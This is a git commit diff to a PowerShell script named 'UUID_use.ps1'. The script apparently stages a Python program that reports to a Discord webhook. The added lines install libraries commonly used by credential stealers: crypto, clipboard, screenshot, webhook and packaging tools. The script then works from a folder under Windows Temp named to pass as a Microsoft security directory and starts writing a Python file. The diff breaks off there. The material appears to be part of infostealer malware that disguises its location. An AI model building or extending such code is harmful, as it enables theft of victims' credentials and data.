dd75585b0b7290f7aac18bb7e9de03ffd0d54af8
Appolon24800 <93398824+Appolon24800@users.noreply.github.com>
2023-01-18 16:45:23 +0100

    Update UUID_use.ps1

--- UUID_use.ps1
+++ UUID_use.ps1
@@ -13,6 +13,20 @@ $webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
 $webHookUrl2="$"+"webHookUrl"
 #####################################################################
 
+pip install requests
+pip install winshell
+pip install psutil
+pip install pypiwin32
+pip install pycryptodome
+pip install cryptography
+pip install pillow
+pip install discord_webhook
+pip install pyperclip
+pip install pyinstaller
+pip install chardet
+
+
+
 cd C:\Windows\Temp\Win.microsoft.Security.temp
 
 Set-Content UUID_create.py "
